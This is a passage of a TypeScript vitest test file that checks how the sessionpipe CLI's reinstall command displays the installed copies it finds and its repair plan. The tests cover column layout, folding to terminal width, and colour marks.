// SPDX-License-Identifier: Apache-2.0
// The two screens `sessionpipe reinstall` shows before it does anything (reinstall/page.ts):
// what it found, and what will happen, a row an action. As whole lines for a pipe, and
// folded for a terminal of 80 columns and of 120 (a line is never set wider than 100),
// where every line must fit and no word may be lost; with colour and without it, where
// the sign and the verb of a row must say its kind by themselves.
import path from "node:path";
import { describe, expect, it } from "vitest";
import type { Copy, Home, Inventory } from "../src/reinstall/find.js";
import { found, leftAlone, planned, usedBy } from "../src/reinstall/page.js";
import { type Facts, type Left, type Plan, plan, type Step, slotIn } from "../src/reinstall/plan.js";
import { shq } from "../src/shell.js";
import { clean, cols, MAX_WIDTH, makeUi, mark, PLAIN, plain, tint, type Ui } from "../src/style.js";

const ESC = String.fromCharCode(27);
const TTY: Ui = makeUi({ isTTY: true, columns: 80, env: {}, platform: "darwin" });
/** A wide terminal: a line is set to 100 columns there, not to the terminal's 120. */
const WIDE: Ui = makeUi({ isTTY: true, columns: 120, env: {}, platform: "darwin" });
/** The same two with colour off (NO_COLOR): only the folding shows. */
const MONO: Ui = makeUi({ isTTY: true, columns: 80, env: { NO_COLOR: "1" }, platform: "darwin" });
const MONO_WIDE: Ui = makeUi({ isTTY: true, columns: 120, env: { NO_COLOR: "1" }, platform: "darwin" });

const ROOT = path.resolve(path.sep, "w");
/** The folder a place stands for here: nothing is opened, a plan only compares them. */
const folder = (where: string): string => path.join(ROOT, ...where.split(/[^\w.-]+/).filter(Boolean));
const LOCAL = folder("~/.local");
/** A published copy as the look lists it: whole, used by nothing. `where` is all the
 *  page shows of its place. One that was left behind by an install is beside the slot,
 *  under the name npm gives such a folder. */
const copy = (where: string, over: Partial<Copy> = {}): Copy => {
  const prefix = folder(where);
  return {
    dir: over.aside ? path.join(path.dirname(slotIn(prefix)), ".sessionpipe-Zz9Yy8Xx") : slotIn(prefix),
    where,
    prefix,
    slot: "global",
    not: null,
    aside: false,
    version: "1.2.0",
    wrong: null,
    bins: [],
    uses: [],
    onPath: true,
    writable: true,
    keeper: null,
    ...over,
  };
};
/** Where the one copy lives: a prefix this user may write, whose bin folder a shell looks in. */
const home = (where = "~/.local", over: Partial<Home> = {}): Home => ({
  prefix: folder(where),
  shown: where,
  why: "where the one you type is",
  bin: path.join(folder(where), "bin"),
  onPath: true,
  blocked: null,
  writable: true,
  ...over,
});
/** What a look found. The page reads the copies and the links that lead nowhere; what is
 *  typed and where the home is are the plan's to read. */
const inv = (copies: Copy[], over: Partial<Inventory> = {}): Inventory => ({
  reach: true,
  copies,
  dangling: [],
  strangers: [],
  onPath: [],
  typed: copies.find((c) => c.uses.includes("typed"))?.dir ?? null,
  unsure: null,
  home: home(),
  taken: null,
  prefixes: [],
  npx: folder("~/.npm/_npx"),
  ...over,
});
type Service = NonNullable<Facts["service"]>;
const service = (over: Partial<Service> = {}): Service => ({
  file: "/home/u/.config/systemd/user/sessionpipe-control.service",
  loaded: true,
  pid: 100,
  node: "/usr/bin/node",
  nodeOk: true,
  cliOk: true,
  ...over,
});
/** Nothing wrong beside the copies: no service file, no daemon. */
const facts = (over: Partial<Facts> = {}): Facts => ({
  latest: { version: "1.2.0" },
  npm: true,
  harnesses: ["claude"],
  hooks: { version: "1.2.0", wrong: [] },
  hookFiles: ["/home/u/.local/share/sessionpipe/hook", "/home/u/.claude/settings.json"],
  wanted: true,
  service: null,
  staleSocket: false,
  daemon: null,
  apart: null,
  ...over,
});
const SAFE = "Nothing is touched until 1.2.0 has been downloaded and seen to run.";
const RESTARTS = "The service keeps its environment and restarts once it holds nothing.";
/** The two steps every plan has, neither with a row of its own. */
const FETCH: Step = { do: "fetch", version: "1.2.0", touches: [] };
const PROVE: Step = { do: "prove", touches: [] };
const aPlan = (over: Partial<Plan> = {}): Plan => ({
  nothing: null,
  refuse: null,
  target: "1.2.0",
  home: null,
  stays: null,
  steps: [FETCH, PROVE],
  safety: [SAFE],
  left: [],
  notes: [],
  ...over,
});
/** A step as the plan writes one, by what its row says: the page reads nothing else of it. */
const install = (say: string): Step => ({
  do: "install",
  version: "1.2.0",
  prefix: LOCAL,
  dir: slotIn(LOCAL),
  replaces: true,
  touches: [],
  say,
});
const stop = (say: string): Step => ({ do: "stop", pid: 222, touches: [], say });
const use = (say: string | null): Step => ({ do: "use", serve: true, touches: [], say });
const remove = (say: string): Step => ({ do: "remove", path: path.join(ROOT, "gone"), touches: [], say });
/** What stays, as the plan lists it. Its whole path is never the page's to show. */
const left = (where: string, why: string, over: Partial<Left> = {}): Left => ({
  where,
  path: path.join(ROOT, "whole", "path"),
  version: null,
  why,
  line: null,
  ours: false,
  ...over,
});

const ONE = copy("~/.local", { uses: ["typed", "service", "this", "hooks"] });
/** What the look says is wrong with a copy: each is a few words of its own. */
const BROKEN = "its dist/cli.js is missing (an install that was cut off?)";
const MUTE = "it doesn't run: `--version` printed nothing";
const CUT_OFF = "left behind by an install that was cut off";
const CHECKOUT = "it holds src, which no published sessionpipe has (a checkout or a build?)";
/** A copy in the npx cache: its place is the cache entry it is in. */
const NPX = copy("~/.npm/_npx/0a1b2c3d4e5f6a7b", { slot: "npx", prefix: null, uses: ["this"] });
/** A folder that is no install of sessionpipe: a checkout someone builds in. The proof
 *  refuses it, so it has no slot, and why is in `not`. */
const CHECKED_OUT = copy("~/code/sessionpipe", { version: "1.3.0", slot: null, prefix: null, not: CHECKOUT });
/** A computer after several installs: two releases in use, a copy in the npx cache, one
 *  that is not whole, npm's own leftover, and a checkout. Every folder is short. */
const SEVERAL = [
  copy("~/.local", { version: "1.1.0", uses: ["typed"] }),
  copy("~/.nvm/versions/node/v22.1.0", { version: "1.1.0", uses: ["service", "hooks"] }),
  NPX,
  copy("/opt/homebrew", { version: "1.0.0", wrong: BROKEN }),
  copy("/usr/local", { aside: true, version: null, wrong: CUT_OFF }),
  CHECKED_OUT,
];
/** Volta's copy, whose folder is longer than a column of the table may be: no install of
 *  ours either, for Volta keeps it. */
const VOLTA = copy("~/.volta/tools/image/packages/sessionpipe", {
  slot: null,
  not: "Volta keeps it",
  keeper: "volta uninstall sessionpipe",
});
/** fnm's prefix for one Node: longer still. */
const FNM = "~/.local/share/fnm/node-versions/v22.11.0/installation";

/** Every word of a screen, in order: what folding must keep. */
const words = (lines: string[]): string[] => plain(lines.join(" ")).split(/\s+/).filter(Boolean);
/** A screen fits a terminal of so many columns (one of 120 is set to 100), and says what
 *  the unfolded one says. */
const fits = (folded: string[], whole: string[], columns = 80) => {
  for (const l of folded) expect(cols(l), plain(l)).toBeLessThanOrEqual(Math.min(columns - 1, MAX_WIDTH));
  expect(words(folded)).toEqual(words(whole));
};
/** A screen with nothing between its characters: what it says where a folder was broken
 *  in the middle (a folder has no spaces, so its pieces are no words of their own). */
const letters = (lines: string[]): string => plain(lines.join("")).replace(/\s+/g, "");
/** Every colour code on a line, in order. */
// biome-ignore lint/suspicious/noControlCharactersInRegex: the colours a terminal line is written in
const codes = (line: string): string[] => line.match(/\u001b\[\d+m/g) ?? [];

describe("found: every copy, its release, and what uses it", () => {
  it("one clean copy: one row, and nothing else to say", () => {
    expect(found(PLAIN, inv([ONE]), facts())).toEqual([
      "Found one copy of sessionpipe on this computer",
      "  · 1.2.0  ~/.local  you type this, the background service, the hooks",
    ]);
    // A service that runs what it should, with the daemon that is its own, is nothing to say.
    expect(
      found(PLAIN, inv([ONE]), facts({ service: service(), daemon: { pid: 100, version: "1.2.0", byHand: null } })),
    ).toHaveLength(2);
    // Nor is a daemon someone runs by hand where there is no service file.
    expect(found(PLAIN, inv([ONE]), facts({ daemon: { pid: 222, version: "1.2.0", byHand: null } }))).toHaveLength(2);
  });

  it("several: a row each in columns, the release first; a leftover and a copy that is not whole are named there and marked", () => {
    expect(found(PLAIN, inv(SEVERAL), facts())).toEqual([
      // The checkout is no copy: it is not counted, and has no row here.
      "Found 5 copies of sessionpipe on this computer",
      "  · 1.1.0      ~/.local                      you type this",
      "  · 1.1.0      ~/.nvm/versions/node/v22.1.0  the background service, the hooks",
      "  · 1.2.0      ~/.npm/_npx/0a1b2c3d4e5f6a7b  this command",
      "  ✗ 1.0.0      /opt/homebrew                 nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
      "  ✗ left over  /usr/local                    nothing uses it · left behind by an install that was cut off",
    ]);
    expect(found(PLAIN, inv(SEVERAL), facts()).join("\n")).not.toContain(CHECKOUT);
  });

  it("what is left of a copy that was emptied (ours, of no release: a folder left behind, in the slot itself) is a leftover by that name: in the table, and in the plan's row for it", () => {
    // An empty folder of the name in a slot: the proof accepts it, and the look calls it
    // a folder left behind, as it calls npm's own beside a slot.
    const LEFT = "left behind by an install that was cut off";
    const emptied = copy("/usr/local", { dir: slotIn(folder("/usr/local")), aside: true, version: null, wrong: LEFT });
    const lines = found(PLAIN, inv([ONE, emptied]), facts());
    expect(lines).toEqual([
      "Found 2 copies of sessionpipe on this computer",
      "  · 1.2.0      ~/.local    you type this, the background service, the hooks",
      "  ✗ left over  /usr/local  nothing uses it · left behind by an install that was cut off",
    ]);
    expect(lines.join("\n")).not.toMatch(/null|undefined/);
    // Where the folders are long, on a line of its own.
    const deep = copy("~/.local/share/fnm/node-versions/v22.11.0/installation", {
      dir: slotIn(folder("~/.local/share/fnm/node-versions/v22.11.0/installation")),
      aside: true,
      version: null,
      wrong: LEFT,
    });
    expect(found(PLAIN, inv([ONE, deep]), facts()).slice(-2)).toEqual([
      "  ✗ ~/.local/share/fnm/node-versions/v22.11.0/installation",
      "      left over · nothing uses it · left behind by an install that was cut off",
    ]);
    // The plan removes it under the same name a leftover of npm's has.
    const p = plan(inv([ONE, emptied]), facts());
    expect(planned(PLAIN, p)).toContain("  - remove   a leftover folder in /usr/local");
    expect(planned(PLAIN, p).join("\n")).not.toMatch(/null|undefined/);
    // In the home's own slot it is no copy that is there: the install row gives the
    // home's reason ("replaces null" was said), and no row removes it.
    const inHome = copy("~/.local", { dir: slotIn(LOCAL), aside: true, version: null, wrong: LEFT });
    const fresh = planned(PLAIN, plan(inv([inHome]), facts()));
    expect(fresh.filter((l) => /^ {2}[+-] /.test(l))).toEqual([
      expect.stringMatching(/^ {2}\+ install {2}1\.2\.0, the newest release, fresh in ~\/\.local \(.+\)$/),
    ]);
    expect(fresh.join("\n")).not.toMatch(/null|replaces/);
  });

  it("L10: only a folder the proof accepts is a copy: what is no install of sessionpipe is not counted, and has no row", () => {
    /** Another package under the name, a project's own dependency, a checkout, Volta's. */
    const LEFT_PAD = copy("~/.npm-global", {
      slot: null,
      version: null,
      not: 'its package.json says it is "left-pad", not sessionpipe',
    });
    const DEPENDENCY = copy("~/work/app/lib/node_modules/sessionpipe", {
      slot: null,
      prefix: null,
      uses: ["this"],
      not: "the node_modules folder it is in is a project's own (a package.json is beside it)",
    });
    const REFUSED = [LEFT_PAD, DEPENDENCY, CHECKED_OUT, VOLTA];
    for (const ui of [PLAIN, MONO, TTY, WIDE]) {
      // None that is one: said as that, in one line.
      expect(found(ui, inv(REFUSED), facts()).map(plain)).toEqual(["Found no copy of sessionpipe on this computer"]);
      // One beside them is one copy; two are two. The rows are the rows of those alone:
      // not even the layout is theirs to change (Volta's folder is too long for a column).
      expect(found(ui, inv([LEFT_PAD, ONE, ...REFUSED]), facts())).toEqual(found(ui, inv([ONE]), facts()));
      const two = [ONE, copy("/opt/homebrew", { version: "1.0.0", wrong: BROKEN })];
      expect(found(ui, inv([DEPENDENCY, two[0] as Copy, VOLTA, two[1] as Copy, CHECKED_OUT]), facts())).toEqual(
        found(ui, inv(two), facts()),
      );
      expect(plain(found(ui, inv(two), facts())[0] as string)).toBe("Found 2 copies of sessionpipe on this computer");
      // Nothing of them is on this screen: not a folder, not a reason, not the release one names.
      const screen = found(ui, inv([...REFUSED, ...two]), facts())
        .map(plain)
        .join("\n");
      for (const c of REFUSED) {
        expect(screen).not.toContain(c.where);
        expect(screen).not.toContain(c.not as string);
      }
      expect(screen).not.toMatch(/not an install|left-pad|1\.3\.0/);
    }
    expect(found(PLAIN, inv([ONE, ...REFUSED]), facts())[0]).toBe("Found one copy of sessionpipe on this computer");
    // Where they are said is the plan's list of what is left alone, a row each, with why.
    const p = plan(inv([ONE, ...REFUSED]), facts());
    expect(leftAlone(PLAIN, p.left)).toEqual([
      "Left alone",
      "  · ~/.npm-global",
      '      its package.json says it is "left-pad", not sessionpipe',
      "  · ~/work/app/lib/node_modules/sessionpipe",
      "      the node_modules folder it is in is a project's own (a package.json is beside it)",
      "  · ~/code/sessionpipe",
      "      it holds src, which no published sessionpipe has (a checkout or a build?)",
      "  · ~/.volta/tools/image/packages/sessionpipe",
      "      Volta keeps it: `volta uninstall sessionpipe` removes it",
    ]);
  });

  it("a folder too long for a column: every copy's folder gets a line of its own, and the rest goes under it", () => {
    expect(found(PLAIN, inv([...SEVERAL, copy(FNM, { wrong: MUTE })]), facts())).toEqual([
      "Found 6 copies of sessionpipe on this computer",
      "  · ~/.local",
      "      1.1.0 · you type this",
      "  · ~/.nvm/versions/node/v22.1.0",
      "      1.1.0 · the background service, the hooks",
      "  · ~/.npm/_npx/0a1b2c3d4e5f6a7b",
      "      1.2.0 · this command",
      "  ✗ /opt/homebrew",
      "      1.0.0 · nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
      "  ✗ /usr/local",
      "      left over · nothing uses it · left behind by an install that was cut off",
      `  ✗ ${FNM}`,
      "      1.2.0 · nothing uses it · it doesn't run: `--version` printed nothing",
    ]);
    // One such folder is enough, wherever it is in the list, and with one copy too.
    expect(found(PLAIN, inv([copy(FNM, { uses: ["typed"] }), NPX]), facts())).toEqual([
      "Found 2 copies of sessionpipe on this computer",
      `  · ${FNM}`,
      "      1.2.0 · you type this",
      "  · ~/.npm/_npx/0a1b2c3d4e5f6a7b",
      "      1.2.0 · this command",
    ]);
    expect(found(PLAIN, inv([copy(FNM)]), facts())).toEqual([
      "Found one copy of sessionpipe on this computer",
      `  · ${FNM}`,
      "      1.2.0 · nothing uses it",
    ]);
  });

  it("36 columns of folder still fit the column; one more and the folders have their own lines", () => {
    const fits36 = `~/${"a".repeat(34)}`;
    expect(found(PLAIN, inv([copy(fits36)]), facts())).toEqual([
      "Found one copy of sessionpipe on this computer",
      `  · 1.2.0  ${fits36}  nothing uses it`,
    ]);
    expect(found(PLAIN, inv([copy(`${fits36}a`)]), facts())).toEqual([
      "Found one copy of sessionpipe on this computer",
      `  · ${fits36}a`,
      "      1.2.0 · nothing uses it",
    ]);
  });

  it("a copy is marked by what is wrong with it, said after what uses it; one with nothing wrong is not marked", () => {
    const row = (over: Partial<Copy>) => found(PLAIN, inv([copy("~/.local", over)]), facts())[1];
    expect(row({})).toBe("  · 1.2.0  ~/.local  nothing uses it");
    expect(row({ wrong: MUTE })).toBe(
      "  ✗ 1.2.0  ~/.local  nothing uses it · it doesn't run: `--version` printed nothing",
    );
    expect(row({ wrong: "npm's link to it is gone", uses: ["service"] })).toBe(
      "  ✗ 1.2.0  ~/.local  the background service · npm's link to it is gone",
    );
    // On a line of its own the folder carries the mark.
    expect(found(PLAIN, inv([copy(FNM, { wrong: MUTE })]), facts()).slice(1)).toEqual([
      `  ✗ ${FNM}`,
      "      1.2.0 · nothing uses it · it doesn't run: `--version` printed nothing",
    ]);
    // In colour: red for one that has something wrong, dim for one that has not.
    expect(found(TTY, inv([copy("~/.local", { wrong: MUTE })]), facts())[1]?.startsWith(`  ${mark(TTY, "bad")} `)).toBe(
      true,
    );
    expect(found(TTY, inv([copy("~/.local")]), facts())[1]?.startsWith(`  ${mark(TTY, "info")} `)).toBe(true);
  });

  it("'this command' is said only of a copy nobody types", () => {
    const used = (uses: Copy["uses"]) => found(PLAIN, inv([copy("~", { uses })]), facts())[1];
    expect(used(["typed", "this"])).toBe("  · 1.2.0  ~  you type this");
    expect(used(["typed", "service", "this", "hooks"])).toBe(
      "  · 1.2.0  ~  you type this, the background service, the hooks",
    );
    expect(used(["this"])).toBe("  · 1.2.0  ~  this command");
    expect(used(["service", "this", "hooks"])).toBe("  · 1.2.0  ~  the background service, this command, the hooks");
    expect(used(["typed"])).toBe("  · 1.2.0  ~  you type this");
    expect(used([])).toBe("  · 1.2.0  ~  nothing uses it");
    // The same where the folder has its own line.
    const under = (uses: Copy["uses"]) => found(PLAIN, inv([copy(FNM, { uses })]), facts())[2];
    expect(under(["typed", "this"])).toBe("      1.2.0 · you type this");
    expect(under(["this"])).toBe("      1.2.0 · this command");
  });

  it("also found: links that lead nowhere, and what is wrong with the hooks and the service; a file that is no install is not among them", () => {
    const i = inv([ONE], {
      dangling: ["/usr/local/bin/sessionpipe", "/home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe"],
      // Not wrong, and not this command's: it is a row under "Left alone", and no finding.
      strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file npm didn't put there" }],
    });
    const f = facts({
      hooks: {
        version: "1.1.0",
        wrong: ["the hook file names a node that is gone", "claude: missing (~/.claude/settings.json)"],
      },
      service: service({ loaded: false, pid: null, node: "/gone/bin/node", nodeOk: false, cliOk: false }),
      staleSocket: true,
    });
    expect(found(PLAIN, i, f)).toEqual([
      "Found one copy of sessionpipe on this computer",
      "  · 1.2.0  ~/.local  you type this, the background service, the hooks",
      "",
      "Also found",
      "  ! /usr/local/bin/sessionpipe is a link to a sessionpipe that is gone",
      "  ! /home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe is a link to a sessionpipe that is gone",
      "  ! the hooks: the hook file names a node that is gone",
      "  ! the hooks: claude: missing (~/.claude/settings.json)",
      "  ! the service file names a node that is gone (/gone/bin/node)",
      "  ! the service file names a copy of sessionpipe that is gone",
      "  ! a socket file is there with no daemon behind it (the next one that starts replaces it)",
      "  ! the service file is there, and the service is not loaded",
    ]);
    expect(found(PLAIN, i, f).join("\n")).not.toContain("/home/u/bin/sessionpipe");
    // With such a file and nothing else beside the copy, there is nothing "also found" at all.
    expect(found(PLAIN, inv([ONE], { strangers: i.strangers }), facts())).toEqual([
      "Found one copy of sessionpipe on this computer",
      "  · 1.2.0  ~/.local  you type this, the background service, the hooks",
    ]);
  });

  it("a link that leads nowhere and the node a service file names are said as the caller shows a path; nothing else is", () => {
    /** A `show` that marks what it was handed, as the command's `~/…` would shorten it. */
    const show = (p: string) => `<${p}>`;
    const i = inv([ONE, copy("/opt/homebrew", { version: "1.0.0", wrong: BROKEN })], {
      dangling: ["/usr/local/bin/sessionpipe", "/home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe"],
      strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file npm didn't put there" }],
    });
    const f = facts({
      hooks: { version: "1.1.0", wrong: ["claude: missing (/home/u/.claude/settings.json)"] },
      service: service({ node: "/gone/bin/node", nodeOk: false }),
      daemon: { pid: 100, version: "1.2.0", byHand: null },
    });
    const lines = found(PLAIN, i, f, show);
    expect(lines).toEqual([
      "Found 2 copies of sessionpipe on this computer",
      // A copy's place is the look's own word for it, shortened already.
      "  · 1.2.0  ~/.local       you type this, the background service, the hooks",
      "  ✗ 1.0.0  /opt/homebrew  nothing uses it · its dist/cli.js is missing (an install that was cut off?)",
      "",
      "Also found",
      "  ! </usr/local/bin/sessionpipe> is a link to a sessionpipe that is gone",
      "  ! </home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe> is a link to a sessionpipe that is gone",
      // (The file that is no install is shown by the plan, where it is listed as left.)
      // What the hooks say is theirs, word for word.
      "  ! the hooks: claude: missing (/home/u/.claude/settings.json)",
      // The node the service file names is a path as any other.
      "  ! the service file names a node that is gone (</gone/bin/node>)",
    ]);
    // A service file with no program in it names none: there is no path to show.
    expect(
      found(
        PLAIN,
        inv([ONE]),
        facts({ ...f, hooks: { version: "1.2.0", wrong: [] }, service: service({ node: null, nodeOk: false }) }),
        show,
      ).slice(-1),
    ).toEqual(["  ! the service file names a node that is gone (?)"]);
    // With nothing said about how, each is the path as it was found; the rest is the same.
    const whole = found(PLAIN, i, f);
    expect(whole.join("\n")).not.toContain("<");
    expect(whole).toEqual(lines.map((l) => l.replace(/[<>]/g, "")));
    expect(whole).toEqual(found(PLAIN, i, f, (p) => p));
    // Shown before it is folded: at a terminal the line breaks by the width of the words
    // as they are shown, a word later here than with the whole path.
    const short = (p: string) => p.replace("/home/u/", "~/");
    const folded = found(TTY, i, f, short);
    fits(folded, found(PLAIN, i, f, short));
    expect(folded.map(plain)).toContain("  ! ~/.nvm/versions/node/v20.0.0/bin/sessionpipe is a link to a sessionpipe");
    expect(folded.map(plain)).toContain("    that is gone");
    const unshown = found(TTY, i, f).map(plain);
    expect(unshown).toContain("  ! /home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe is a link to a");
    expect(unshown).toContain("    sessionpipe that is gone");
  });

  it("also found, of the service alone: each thing by itself", () => {
    const also = (f: Partial<Facts>) => found(PLAIN, inv([ONE]), facts(f)).slice(2);
    const up = { pid: 100, version: "1.2.0", byHand: null };
    // A service file with no program in it names no node.
    expect(also({ service: service({ node: null, nodeOk: false }), daemon: up })).toEqual([
      "",
      "Also found",
      "  ! the service file names a node that is gone (?)",
    ]);
    expect(also({ service: service({ cliOk: false }), daemon: up })).toEqual([
      "",
      "Also found",
      "  ! the service file names a copy of sessionpipe that is gone",
    ]);
    expect(also({ staleSocket: true })).toEqual([
      "",
      "Also found",
      "  ! a socket file is there with no daemon behind it (the next one that starts replaces it)",
    ]);
    expect(also({ service: service({ loaded: false }), daemon: up })).toEqual([
      "",
      "Also found",
      "  ! the service file is there, and the service is not loaded",
    ]);
    expect(also({ service: service(), daemon: null })).toEqual([
      "",
      "Also found",
      "  ! the service is loaded, and nothing answers",
    ]);
    expect(also({ service: service(), daemon: { pid: 222, version: "1.2.0", byHand: null } })).toEqual([
      "",
      "Also found",
      "  ! a daemon someone started by hand (pid 222) holds the socket the service needs",
    ]);
    // Not loaded, and a daemon that says someone started it answers all the same: both are said.
    expect(
      also({ service: service({ loaded: false, pid: null }), daemon: { pid: 222, version: "1.2.0", byHand: true } }),
    ).toEqual([
      "",
      "Also found",
      "  ! the service file is there, and the service is not loaded",
      "  ! a daemon someone started by hand (pid 222) holds the socket the service needs",
    ]);
  });

  it("two daemons are found by the plan's own definition: never where the manager names the daemon that answers; else by the daemon's own word, or by its being another process where it doesn't say", () => {
    const BY_HAND = (pid: number) =>
      `  ! a daemon someone started by hand (pid ${pid}) holds the socket the service needs`;
    /** Who the manager names (the daemon that answers is pid 7), what the daemon says of
     *  who started it, and whether the page says there are two. */
    const TABLE: [number | null, boolean | null, boolean][] = [
      [7, false, false],
      [7, null, false],
      [7, true, false],
      [100, true, true],
      [100, false, false],
      [100, null, true],
      [null, true, true],
      [null, false, false],
      [null, null, false],
    ];
    for (const [pid, byHand, two] of TABLE) {
      const f = facts({ service: service({ pid }), daemon: { pid: 7, version: "1.2.0", byHand } });
      const lines = found(PLAIN, inv([ONE]), f);
      expect(lines.includes(BY_HAND(7)), `${pid} ${byHand}`).toBe(two);
      // It is the one thing found of such a service, or nothing is: no heading for nothing.
      expect(lines.slice(2), `${pid} ${byHand}`).toEqual(two ? ["", "Also found", BY_HAND(7)] : []);
      // And the plan for the same facts stops that daemon in the same rows: the page and
      // the plan read one definition.
      expect(
        plan(inv([ONE]), f).steps.some((s) => s.do === "stop"),
        `${pid} ${byHand}`,
      ).toBe(two);
    }
    // With no service file there are no two, whatever a daemon says of itself.
    for (const byHand of [true, false, null])
      expect(
        found(PLAIN, inv([ONE]), facts({ service: null, daemon: { pid: 7, version: "1.2.0", byHand } })),
      ).toHaveLength(2);
  });

  it("L8: a service file on a computer that needs no service is no finding: nothing is found of it, the plan leaves the file, and says nothing of it", () => {
    const also = (f: Partial<Facts>) => found(PLAIN, inv([ONE]), facts(f)).slice(2);
    // A service file nothing here needs, with no daemon answering, is nobody's to mend:
    // whatever its manager says of it, and whatever it names, nothing is found. ("Also
    // found ! the service is loaded, and nothing answers" stood above "✓ Nothing to
    // repair" on a computer doctor calls all good.)
    for (const s of [
      service(),
      service({ loaded: false, pid: null }),
      service({ node: null, nodeOk: false, cliOk: false }),
      service({ loaded: false, pid: null, nodeOk: false, cliOk: false }),
    ])
      expect(also({ service: s, wanted: false, daemon: null })).toEqual([]);
    // What is said of a service is said of one this computer wants, or runs.
    expect(also({ service: service(), wanted: true, daemon: null })).toEqual([
      "",
      "Also found",
      "  ! the service is loaded, and nothing answers",
    ]);
    // Nothing here needs it and a daemon answers all the same: it is run, so it is said.
    const up = { pid: 100, version: "1.2.0", byHand: null };
    expect(also({ service: service({ loaded: false, pid: 100 }), wanted: false, daemon: up })).toEqual([
      "",
      "Also found",
      "  ! the service file is there, and the service is not loaded",
    ]);
    expect(
      also({ service: service({ node: null, nodeOk: false, cliOk: false, pid: 100 }), wanted: false, daemon: up }),
    ).toEqual([
      "",
      "Also found",
      "  ! the service file names a node that is gone (?)",
      "  ! the service file names a copy of sessionpipe that is gone",
    ]);
    // A socket file with nothing behind it is said whoever needs the service.
    expect(also({ service: service(), wanted: false, daemon: null, staleSocket: true })).toEqual([
      "",
      "Also found",
      "  ! a socket file is there with no daemon behind it (the next one that starts replaces it)",
    ]);
    expect(also({ service: service(), wanted: false, daemon: { pid: 100, version: "1.2.0", byHand: null } })).toEqual(
      [],
    );
    expect(also({ wanted: false })).toEqual([]);
    // The plan for such a computer, with a second copy to remove: no row takes the service
    // file away, no step touches it, and nothing is said of it. It is no finding, of this
    // command's as of doctor's: a note here made "nothing to repair" something else on a
    // computer doctor calls all good.
    const two = inv([ONE, copy("~/.nvm/versions/node/v22.1.0", { version: "1.1.0" })]);
    const idle = facts({ service: service(), wanted: false, daemon: null });
    const p = plan(two, idle);
    expect(p.notes).toEqual([]);
    expect(p.steps.flatMap((s) => s.touches)).not.toContain(service().file);
    expect(planned(PLAIN, p)).toEqual([
      "This will",
      "  + install  1.2.0, the newest release, fresh in ~/.local (replaces 1.2.0)",
      "  ~ switch   the hooks to it",
      "  - remove   1.1.0 in ~/.nvm/versions/node/v22.1.0",
      "  = keep     pairings, settings, keys, messages waiting to be sent",
      "",
      SAFE,
    ]);
    for (const ui of [PLAIN, TTY]) expect(planned(ui, p).map(plain).join("\n")).not.toMatch(/service file/);
    // With that one copy alone it is a computer with nothing to repair, and no note.
    const one = plan(inv([ONE]), idle);
    expect(one.steps).toEqual([]);
    expect(one.notes).toEqual([]);
    expect(one.nothing).toBe("Nothing to repair: one sessionpipe, 1.2.0, the newest release.");
  });

  it("at an 80-column terminal every line fits, in colour, and says what the whole lines say", () => {
    // The places a copy usually is, and each kind of row.
    const copies = [
      copy("~/.local", { version: "1.1.0", uses: ["typed", "this"] }),
      copy("~/.nvm/versions/node/v22.1.0", { version: "1.1.0", uses: ["service", "hooks"] }),
      copy("~/.npm/_npx/0a1b2c3d4e5f6a7b", { slot: "npx", prefix: null }),
      copy("/opt/homebrew", { version: "1.0.0", wrong: BROKEN }),
      CHECKED_OUT,
    ];
    const i = inv(copies, {
      dangling: ["/usr/local/bin/sessionpipe", "/home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe"],
      strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file npm didn't put there" }],
    });
    const f = facts({
      hooks: { version: "1.1.0", wrong: ["claude: missing (~/.claude/settings.json)"] },
      service: service({ loaded: false, pid: null, node: "/gone/bin/node", nodeOk: false, cliOk: false }),
      staleSocket: true,
      daemon: { pid: 222, version: "1.1.0", byHand: null },
    });
    const lines = found(TTY, i, f);
    fits(lines, found(PLAIN, i, f));
    // What uses a copy folds under its own column.
    expect(lines.length).toBeGreaterThan(found(PLAIN, i, f).length);
    expect(lines[0]).toBe(tint(TTY, "bold", "Found 4 copies of sessionpipe on this computer"));
    expect(lines).toContain(tint(TTY, "bold", "Also found"));
    // The marks are in their colours: a copy that is whole, a broken one, a finding.
    expect(lines[1]?.startsWith(`  ${mark(TTY, "info")} 1.1.0 `)).toBe(true);
    expect(lines.some((l) => l.startsWith(`  ${mark(TTY, "bad")} 1.0.0 `))).toBe(true);
    expect(lines.some((l) => l.startsWith(`  ${mark(TTY, "warn")} /usr/local/bin/sessionpipe is a link`))).toBe(true);
    // What is said of a copy folds under its own column, past the release and the folder.
    const column = plain(lines[1] as string).indexOf("you type this");
    expect(column).toBeGreaterThan(0);
    const broken = lines.findIndex((l) => l.startsWith(`  ${mark(TTY, "bad")} 1.0.0 `));
    expect(plain(lines[broken + 1] as string)).toMatch(new RegExp(`^ {${column}}\\S`));
    // A finding too long for the line goes on under its own words, not under its mark.
    const also = lines.slice(lines.indexOf(tint(TTY, "bold", "Also found")) + 1);
    expect(also.length).toBeGreaterThan(found(PLAIN, i, f).length - found(PLAIN, i, f).indexOf("Also found") - 1);
    for (const l of also) expect(l.startsWith(`  ${mark(TTY, "warn")} `) || /^ {4}\S/.test(l), plain(l)).toBe(true);
    const long = also.findIndex((l) => plain(l).startsWith("  ! /home/u/.nvm/versions/node/v20.0.0/bin/sessionpipe "));
    expect(plain(also[long + 1] as string)).toMatch(/^ {4}\S/);
    // A leftover's row too, beside copies in short places.
    const withLeftover = inv([
      copies[0] as Copy,
      copies[1] as Copy,
      copy("~/.local", { aside: true, version: null, wrong: CUT_OFF }),
    ]);
    fits(found(TTY, withLeftover, facts()), found(PLAIN, withLeftover, facts()));
    fits(found(TTY, inv([ONE]), facts()), found(PLAIN, inv([ONE]), facts()));
  });

  it("at 80 columns a copy in the npx cache beside a leftover fits: the widest row the table has", () => {
    // `npx -y sessionpipe@latest reinstall` on a computer whose install was cut off.
    const copies = [
      copy("~/.local", { version: "1.1.0", wrong: BROKEN, uses: ["typed"] }),
      copy("~/.local", { aside: true, version: null, wrong: CUT_OFF }),
      NPX,
      copy("~/.nvm/versions/node/v22.1.0", { version: "1.1.0", uses: ["service", "hooks"] }),
    ];
